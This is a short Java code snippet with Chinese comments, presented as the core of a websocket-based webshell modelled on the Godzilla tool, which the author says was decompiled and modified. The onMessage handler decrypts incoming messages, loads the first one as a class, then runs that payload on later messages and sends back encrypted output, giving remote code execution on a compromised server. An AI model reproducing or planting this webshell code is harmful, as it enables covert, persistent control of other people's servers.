// 哥斯拉实现websocket马核心代码片段

//由于是反编译修改了原作者的软件，所以并不会公布工具，但会陆续公开实现代码和实现过程原理


public void onMessage(ByteBuffer databf) {
    try {
        data=x(databf.array(), false);
        if (session.getUserProperties().get("payload")==null){
            session.getUserProperties().put("payload",new X(this.getClass().getClassLoader()).Q(data));
            session.getBasicRemote().sendObject(x("ok".getBytes(), true));
        }else{
            session.getUserProperties().put("parameters", data);
            Object f=((Class)session.getUserProperties().get("payload")).newInstance();
            java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
            f.equals(arrOut);
            f.equals(session);
            f.equals(data);
            f.toString();
            session.getBasicRemote().sendObject(x(arrOut.toByteArray(), true));
        }
    } catch (Exception ignored) {
    }
}
